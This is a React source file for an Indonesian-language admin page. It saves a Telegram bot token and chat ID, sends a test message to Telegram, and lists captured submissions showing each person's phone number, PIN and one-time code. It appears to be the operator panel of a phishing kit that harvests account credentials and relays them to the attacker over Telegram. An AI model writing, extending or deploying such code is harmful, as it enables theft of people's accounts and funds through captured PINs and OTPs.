import { useState, useEffect } from "react";
import { base44 } from "@/api/base44Client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { Settings as SettingsIcon, Send, Trash2 } from "lucide-react";

export default function Settings() {
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [configId, setConfigId] = useState(null);
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => { loadData(); }, []);

  const loadData = async () => {
    const configs = await base44.entities.TelegramConfig.list();
    if (configs.length > 0) {
      setBotToken(configs[0].bot_token || "");
      setChatId(configs[0].chat_id || "");
      setConfigId(configs[0].id);
    }
    const subs = await base44.entities.Submission.list("-created_date", 50);
    setSubmissions(subs);
    setLoading(false);
  };

  const saveConfig = async () => {
    if (configId) {
      await base44.entities.TelegramConfig.update(configId, { bot_token: botToken, chat_id: chatId });
    } else {
      await base44.entities.TelegramConfig.create({ bot_token: botToken, chat_id: chatId });
    }
    toast.success("Konfigurasi Telegram berhasil disimpan!");
    loadData();
  };

  const testTelegram = async () => {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: "✅ Test koneksi berhasil!" }),
    });
    toast.success("Pesan test terkirim!");
  };

  const deleteSub = async (id) => {
    await base44.entities.Submission.delete(id);
    setSubmissions((s) => s.filter((x) => x.id !== id));
  };

  if (loading) return (
    <div className="flex items-center justify-center min-h-screen">
      <div className="w-8 h-8 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-50 max-w-2xl mx-auto p-4">
      <div className="flex items-center gap-2 mb-6">
        <SettingsIcon className="w-6 h-6 text-gray-700" />
        <h1 className="text-2xl font-bold text-gray-800">Pengaturan Admin</h1>
      </div>

      <div className="bg-white rounded-xl p-5 shadow-sm mb-6">
        <h2 className="font-bold text-lg mb-4">Konfigurasi Telegram</h2>
        <div className="space-y-3">
          <div>
            <label className="text-sm text-gray-600 mb-1 block">Bot Token</label>
            <Input value={botToken} onChange={(e) => setBotToken(e.target.value)} placeholder="123456:ABC-DEF..." />
          </div>
          <div>
            <label className="text-sm text-gray-600 mb-1 block">Chat ID</label>
            <Input value={chatId} onChange={(e) => setChatId(e.target.value)} placeholder="-100123456789" />
          </div>
          <div className="flex gap-2">
            <Button onClick={saveConfig} className="bg-[#108ee9] hover:bg-[#0d7dd4]">Simpan</Button>
            <Button onClick={testTelegram} variant="outline" className="gap-1">
              <Send className="w-4 h-4" /> Test Kirim
            </Button>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-xl p-5 shadow-sm">
        <h2 className="font-bold text-lg mb-4">Data Masuk ({submissions.length})</h2>
        {submissions.length === 0 ? (
          <p className="text-gray-500 text-sm">Belum ada data masuk.</p>
        ) : (
          <div className="space-y-3">
            {submissions.map((s) => (
              <div key={s.id} className="border rounded-lg p-3 flex items-center justify-between">
                <div>
                  <p className="font-medium">{s.phone || "-"}</p>
                  <div className="flex gap-3 text-sm text-gray-500">
                    <span>PIN: {s.pin || "-"}</span>
                    <span>OTP: {s.otp || "-"}</span>
                    <span className={`px-2 py-0.5 rounded text-xs font-medium ${s.status === "completed" ? "bg-green-100 text-green-700" : "bg-yellow-100 text-yellow-700"}`}>
                      {s.status}
                    </span>
                  </div>
                </div>
                <Button size="icon" variant="ghost" onClick={() => deleteSub(s.id)}>
                  <Trash2 className="w-4 h-4 text-red-500" />
                </Button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
